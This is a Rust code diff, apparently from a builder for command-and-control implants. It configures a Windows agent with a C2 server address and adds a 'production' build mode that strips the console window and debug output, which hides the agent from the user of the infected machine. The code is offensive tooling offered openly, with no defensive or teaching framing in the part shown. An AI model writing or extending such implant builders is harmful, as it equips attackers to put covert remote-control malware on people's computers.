@@ -8,6 +8,7 @@ use std::process::Command;
 pub fn generate_agent(
     output_name: &str,
     c2_server: &str,
+    production: bool,
 ) -> Result<(), Box<dyn std::error::Error>> {
     println!("🔧 Generando configuración del agente...");
 
@@ -42,10 +43,25 @@ pub fn generate_agent(
     println!("✅ Configuración escrita en {}", config_file_path);
     println!("🌐 Servidor C2 configurado: {}", c2_server);
 
-    // Compilar el agente
+    // Compilar el agente con features apropiadas
     println!("🔨 Compilando agente para Windows...");
+    
+    let mut cargo_args = vec!["build", "--release", "--target", "x86_64-pc-windows-gnu"];
+    
+    // Agregar flags de feature según el modo
+    if production {
+        println!("🔒 Modo PRODUCCIÓN: sin consola, sin debug prints");
+        cargo_args.push("--no-default-features");
+        cargo_args.push("--features");
+        cargo_args.push("production");
+    } else {
+        println!("🐛 Modo DESARROLLO: con consola y debug prints");
+        cargo_args.push("--features");
+        cargo_args.push("dev");
+    }
+    
     let output = Command::new("cargo")
-        .args(&["build", "--release", "--target", "x86_64-pc-windows-gnu"])
+        .args(&cargo_args)
         .current_dir(agent_path)
         .output()?;
 
